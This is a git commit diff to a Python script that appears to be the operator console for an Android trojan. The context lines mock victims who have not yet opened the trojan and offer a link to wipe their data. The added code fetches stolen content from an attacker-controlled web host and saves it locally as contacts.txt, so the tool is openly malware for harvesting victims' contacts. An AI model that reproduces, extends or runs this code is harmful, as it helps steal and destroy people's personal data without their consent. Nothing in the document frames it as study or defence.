8e12a81fd637341c587b1f732b48a5b1d81e7405
DemiGodVoid <162964001+DemiGodVoid@users.noreply.github.com>
2026-06-23 20:39:01 -0500

    Update ar.py

--- tools/ar.py
+++ tools/ar.py
@@ -63,7 +63,22 @@ while True:
                 print(f"                                         {RED}Dumbass has yet to open the trojan, waiting...\n                                         To wipe data, go to {RESET}" + delete_data)
                 
         else:
-            print(f"Received status code {response.status_code}")
+            print(f"File too large, Received status code {response.status_code}")
+            user_input = input("Download content? Y/N: ")
+        if user_input.strip().lower() == 'y':
+            try:
+                download_url = "http://bluntcord.medianewsonline.com/aroid_to/download.php"
+                response = requests.get(download_url)
+                if response.status_code == 200:
+                    with open(os.path.expanduser('~/Downloads/contacts.txt'), 'w') as file:
+                        file.write(response.text)
+                    print("File downloaded successfully to Downloads folder.")
+                else:
+                    print(f"Failed to download file. Status code: {response.status_code}")
+            except Exception as e:
+                print(f"Error during download: {e}")
+        break
+
     except Exception as e:
         print(f"Error fetching data, Content might be too large to gather. Download it.: {e}")
         user_input = input("Download content? Y/N: ")
